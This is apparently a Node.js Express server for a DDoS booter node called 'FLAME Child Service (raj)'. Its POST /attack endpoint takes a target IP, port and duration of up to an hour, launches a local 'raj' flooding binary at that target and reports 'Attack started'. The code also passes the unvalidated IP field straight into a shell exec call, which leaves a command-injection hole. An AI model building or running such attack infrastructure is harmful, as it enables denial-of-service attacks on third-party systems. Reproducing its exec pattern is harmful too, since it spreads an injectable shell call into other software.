const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

const BIN_PATH = path.join(__dirname, 'raj');

// Check binary on startup
if (fs.existsSync(BIN_PATH)) {
    console.log(`✅ Binary found: ${BIN_PATH}`);
    try {
        fs.chmodSync(BIN_PATH, 0o755);
        console.log(`✅ Binary permissions set`);
    } catch (err) {
        console.error(`❌ Failed to set permissions: ${err.message}`);
    }
} else {
    console.error(`❌ Binary not found at: ${BIN_PATH}`);
}

// Attack endpoint
app.post('/attack', (req, res) => {
    const { ip, port, duration } = req.body;
    
    // Validate parameters
    if (!ip || !port || !duration) {
        return res.status(400).json({ 
            error: 'Missing parameters', 
            required: ['ip', 'port', 'duration'] 
        });
    }
    
    // Validate port range
    const portNum = parseInt(port);
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
        return res.status(400).json({ error: 'Invalid port number' });
    }
    
    // Validate duration
    const durationNum = parseInt(duration);
    if (isNaN(durationNum) || durationNum < 1 || durationNum > 3600) {
        return res.status(400).json({ error: 'Invalid duration (1-3600 seconds)' });
    }
    
    console.log(`🔥 CHILD ATTACK: ${ip}:${portNum} for ${durationNum}s`);
    
    // Check if binary exists before executing
    if (!fs.existsSync(BIN_PATH)) {
        console.error(`❌ Binary missing: ${BIN_PATH}`);
        return res.status(500).json({ error: 'Binary not found' });
    }
    
    // ✅ Execute raj binary: ./raj IP PORT TIME
    const cmd = `${BIN_PATH} ${ip} ${portNum} ${durationNum}`;
    console.log(`🚀 Executing: ${cmd}`);
    
    // Execute and log output
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            console.log(`❌ Binary execution error: ${error.message}`);
            if (stderr) console.log(`stderr: ${stderr}`);
        }
        if (stdout) console.log(`stdout: ${stdout}`);
        if (stderr && !error) console.log(`stderr: ${stderr}`);
    });
    
    // Send response immediately
    res.json({ 
        status: 'ok', 
        target: `${ip}:${portNum}`,
        duration: durationNum,
        message: 'Attack started'
    });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'alive', 
        binary: fs.existsSync(BIN_PATH),
        binary_path: BIN_PATH,
        timestamp: new Date().toISOString()
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({
        name: 'FLAME Child Service (raj)',
        version: '1.0.0',
        status: 'running',
        endpoints: {
            attack: 'POST /attack',
            health: 'GET /health'
        }
    });
});

// Start server
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🔥 Child service running on port ${PORT}`);
    console.log(`📁 Binary path: ${BIN_PATH}`);
    console.log(`✅ Binary exists: ${fs.existsSync(BIN_PATH)}`);
});
